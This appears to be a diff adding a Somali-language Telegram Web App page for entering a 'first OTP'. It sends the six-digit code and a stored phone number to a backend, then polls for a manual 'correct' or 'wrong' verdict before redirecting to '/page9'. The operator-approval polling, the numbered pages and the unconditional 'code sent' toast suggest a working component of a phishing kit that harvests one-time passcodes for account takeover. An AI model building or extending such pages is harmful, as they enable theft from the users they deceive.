@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Xaqiijinta OTP-ga Kowaad</title>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+<style>
+body {
+    font-family: -apple-system, sans-serif;
+    background-color: #f7f7f7;
+    margin: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+}
+
+.toast {
+    position: fixed;
+    top: 40px;
+    background: #263238;
+    color: white;
+    padding: 15px 25px;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 15px;
+    opacity: 0;
+    transition: opacity 0.5s ease;
+    z-index: 100;
+}
+.toast.show { opacity: 1; }
+
+.tick-circle {
+    width: 22px;
+    height: 22px;
+    background: #82d13d;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    font-weight: bold;
+}
+
+.card {
+    background: white;
+    width: 92%;
+    max-width: 420px;
+    margin-top: 60px;
+    padding: 40px 20px;
+    border-radius: 15px;
+    text-align: center;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.05);
+}
+
+#loadingSection { display: none; }
+
+.loader-circle {
+    width: 120px;
+    height: 120px;
+    background: radial-gradient(circle, #a3e635 0%, #82d13d 100%);
+    border-radius: 50%;
+    margin: 0 auto 30px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.loader-circle::after {
+    content: '';
+    width: 90px;
+    height: 90px;
+    border: 4px solid rgba(255,255,255,0.3);
+    border-top: 4px solid white;
+    border-radius: 50%;
+    animation: spin 1.5s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.otp-group {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+}
+
+.otp-input {
+    width: 50px;
+    height: 60px;
+    border: 1.5px solid #82d13d;
+    border-radius: 8px;
+    text-align: center;
+    font-size: 24px;
+    font-weight: bold;
+}
+
+.btn-verify {
+    width: 100%;
+    padding: 18px;
+    border-radius: 10px;
+    border: none;
+    background: #e0e0e0;
+    color: #aaa;
+    font-weight: bold;
+}
+
+.btn-verify.active {
+    background: #82d13d;
+    color: white;
+}
+</style>
+</head>
+
+<body>
+
+<div id="successToast" class="toast">
+    <div class="tick-circle">✓</div>
+    <div>Koodka si guul leh ayaa loo diray!</div>
+</div>
+
+<div class="card" id="inputSection">
+    <h2>Xaqiijinta OTP-ga Kowaad</h2>
+    <p>Geli OTP-ga kowaad ee loogu diray lambarkaaga</p>
+
+    <div class="otp-group">
+        <input type="text" maxlength="1" class="otp-input">
+        <input type="text" maxlength="1" class="otp-input">
+        <input type="text" maxlength="1" class="otp-input">
+        <input type="text" maxlength="1" class="otp-input">
+        <input type="text" maxlength="1" class="otp-input">
+        <input type="text" maxlength="1" class="otp-input">
+    </div>
+
+    <button id="verifyBtn" class="btn-verify" disabled>XAQIIJI OTP-GA KOWAAD</button>
+</div>
+
+<div class="card" id="loadingSection">
+    <div class="loader-circle"></div>
+    <h3 style="color:#82d13d;">Xaqiijinta OTP-ga</h3>
+    <p>Fadlan sug... (<span id="loadTimer">0</span>s)</p>
+</div>
+
+<script>
+const inputs = document.querySelectorAll('.otp-input');
+const verifyBtn = document.getElementById('verifyBtn');
+const inputSection = document.getElementById('inputSection');
+const loadingSection = document.getElementById('loadingSection');
+const loadTimer = document.getElementById('loadTimer');
+
+let timerInterval;
+let pollInterval;
+
+// Telegram safe init
+window.Telegram?.WebApp?.ready();
+window.Telegram?.WebApp?.expand();
+
+// Toast
+window.onload = () => {
+    setTimeout(() => {
+        document.getElementById('successToast').classList.add('show');
+        setTimeout(() => {
+            document.getElementById('successToast').classList.remove('show');
+        }, 2500);
+    }, 400);
+};
+
+// OTP input logic
+inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+        if (input.value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+
+        const filled = [...inputs].every(i => i.value.length === 1);
+        verifyBtn.disabled = !filled;
+        verifyBtn.classList.toggle('active', filled);
+    });
+});
+
+// Button click
+verifyBtn.addEventListener('click', async () => {
+    let otpValue = "";
+    inputs.forEach(i => otpValue += i.value);
+
+    const phone = localStorage.getItem('phone') || "";
+
+    inputSection.style.display = "none";
+    loadingSection.style.display = "block";
+
+    // timer
+    let sec = 0;
+    timerInterval = setInterval(() => {
+        sec++;
+        loadTimer.innerText = sec;
+    }, 1000);
+
+    try {
+        await fetch('/api/verify-first-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, otp: otpValue })
+        });
+    } catch (e) {
+        console.error(e);
+    }
+
+    // polling
+    pollInterval = setInterval(async () => {
+        try {
+            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const data = await res.json();
+
+            if (data.status === "otp1_correct") {
+                clearAll();
+                window.location.href = "/page9";
+            }
+
+            if (data.status === "otp1_wrong") {
+                clearAll();
+                alert("OTP waa khalad");
+                resetUI();
+            }
+        } catch (e) {
+            console.error("Polling error", e);
+        }
+    }, 3000);
+});
+
+function clearAll() {
+    clearInterval(timerInterval);
+    clearInterval(pollInterval);
+}
+
+function resetUI() {
+    loadingSection.style.display = "none";
+    inputSection.style.display = "block";
+    inputs.forEach(i => i.value = "");
+    verifyBtn.disabled = true;
+    verifyBtn.classList.remove('active');
+}
+</script>
+
+</body>
+  </html>
